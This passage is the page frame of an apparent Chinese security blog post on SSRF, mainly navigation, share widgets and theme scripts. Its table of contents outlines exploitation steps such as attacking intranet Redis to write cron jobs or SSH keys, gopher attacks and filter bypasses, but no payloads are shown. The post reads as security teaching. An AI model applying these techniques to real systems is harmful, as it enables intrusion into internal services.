onclick="rm.copyPageUrl('http://example.com/2025/05/27/SSRF/')">SSRF</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/05/27/SSRF/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SSRF&amp;url=http://example.com/2025/05/27/SSRF/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Attackxu の Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/SSRF/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>SSRF<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/05/27/XXE/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XXE</div></div></a></div><div class="next-post pull-right"><a href="/2025/05/27/RCE/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">RCE</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description">这个世界值得我们无限探索</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Attackxu</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hhhanxx" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/487720257" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82"><span class="toc-number">1.</span> <span class="toc-text">客户端请求&amp;服务器端请求</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0"><span class="toc-number">3.</span> <span class="toc-text">原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">4.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-number">5.</span> <span class="toc-text">场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">6.</span> <span class="toc-text">漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-exec"><span class="toc-number">6.1.</span> <span class="toc-text">curl_exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-get-contents"><span class="toc-number">6.2.</span> <span class="toc-text">file_get_contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fsockopen"><span class="toc-number">6.3.</span> <span class="toc-text">fsockopen</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SSRF"><span class="toc-number">7.</span> <span class="toc-text">判断是否存在SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">8.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">8.1.</span> <span class="toc-text">读取敏感文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%90%8Cc%E6%AE%B5%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.2.</span> <span class="toc-text">探测同c段其他主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1-dict"><span class="toc-number">8.3.</span> <span class="toc-text">探测内网服务-dict</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87dict-%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis"><span class="toc-number">8.4.</span> <span class="toc-text">通过dict:&#x2F;&#x2F;协议攻击内网Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">8.4.1.</span> <span class="toc-text">写定时任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-number">8.4.2.</span> <span class="toc-text">写ssh公钥</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">9.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%97%A0%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">10.</span> <span class="toc-text">SSRF无回显解决方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF"><span class="toc-number">11.</span> <span class="toc-text">SSRF漏洞挖掘思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-number">12.</span> <span class="toc-text">SSRF协议利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http-%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number">12.1.</span> <span class="toc-text">http:&#x2F;&#x2F; （常用）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number">12.2.</span> <span class="toc-text">file:&#x2F;&#x2F;&#x2F; （常用）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dict-%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number">12.3.</span> <span class="toc-text">dict:&#x2F;&#x2F; （常用）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sftp"><span class="toc-number">12.4.</span> <span class="toc-text">sftp:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ldap"><span class="toc-number">12.5.</span> <span class="toc-text">ldap:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tftp"><span class="toc-number">12.6.</span> <span class="toc-text">tftp:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gopher-%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number">12.7.</span> <span class="toc-text">gopher:&#x2F;&#x2F; （常用）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">13.</span> <span class="toc-text">SSRF绕过方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%99%BD%E7%9B%92CTF-%E7%BB%95%E8%BF%87-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%AE%A1%E8%AE%A1%E7%82%B9"><span class="toc-number">14.</span> <span class="toc-text">白盒CTF-绕过&amp;伪协议&amp;审计点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#351-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">14.1.</span> <span class="toc-text">351-无过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#352-353-ip%E5%9C%B0%E5%9D%80%E8%BF%87%E6%BB%A4%EF%BC%88IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89"><span class="toc-number">14.2.</span> <span class="toc-text">352-353-ip地址过滤（IP地址进制转换）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#354-%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90ip%E7%BB%95%E8%BF%87"><span class="toc-number">14.3.</span> <span class="toc-text">354-域名解析ip绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#355-356-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6IP%E7%BB%95%E8%BF%87"><span class="toc-number">14.4.</span> <span class="toc-text">355-356-长度限制IP绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#357-%E9%87%8D%E5%AE%9A%E5%90%91%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87"><span class="toc-number">14.5.</span> <span class="toc-text">357-重定向解析绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#358-%E5%8C%B9%E9%85%8D%E4%BD%86%E4%B8%8D%E5%BD%B1%E5%93%8D%E5%86%99%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">14.6.</span> <span class="toc-text">358-匹配但不影响写法绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE%E6%89%93"><span class="toc-number">14.7.</span> <span class="toc-text">gopher协议打</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#359-mysql"><span class="toc-number">14.7.1.</span> <span class="toc-text">359-mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#360-redis"><span class="toc-number">14.7.2.</span> <span class="toc-text">360-redis</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%91%E7%9B%92WEB-%E4%B8%9A%E5%8A%A1%E5%8A%9F%E8%83%BD-URL%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">15.</span> <span class="toc-text">黑盒WEB-业务功能&amp;URL关键字</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/" title="流量特征">流量特征</a><time datetime="2025-05-27T11:58:51.000Z" title="发表于 2025-05-27 19:58:51">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/src%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%97%AE%E9%A2%98/" title="src中遇到的http请求头问题">src中遇到的http请求头问题</a><time datetime="2025-05-27T11:57:04.000Z" title="发表于 2025-05-27 19:57:04">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/Fastjson/" title="Fastjson">Fastjson</a><time datetime="2025-05-27T11:55:58.000Z" title="发表于 2025-05-27 19:55:58">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/SpringBoot/" title="SpringBoot">SpringBoot</a><time datetime="2025-05-27T11:55:22.000Z" title="发表于 2025-05-27 19:55:22">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/Maven/" title="Maven">Maven</a><time datetime="2025-05-27T11:55:04.000Z" title="发表于 2025-05-27 19:55:04">2025-05-27</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="Attackxu" target="_blank">Attackxu</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">6</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/API%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">API安全<sup>2</sup></a><a href="/tags/CRLF/" style="font-size: 0.88rem;">CRLF<sup>1</sup></a><a href="/tags/CSRF/" style="font-size: 0.88rem;">CSRF<sup>1</sup></a><a href="/tags/HTTP/" style="font-size: 0.88rem;">HTTP<sup>4</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>6</sup></a><a href="/tags/JavaScript/" style="font-size: 0.88rem;">JavaScript<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 0.88rem;">SSRF<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 0.88rem;">XSS<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 0.88rem;">XXE<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">sql注入<sup>2</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.88rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/" style="font-size: 0.88rem;">日常生活<sup>2</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 0.88rem;">环境搭建<sup>7</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>7</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
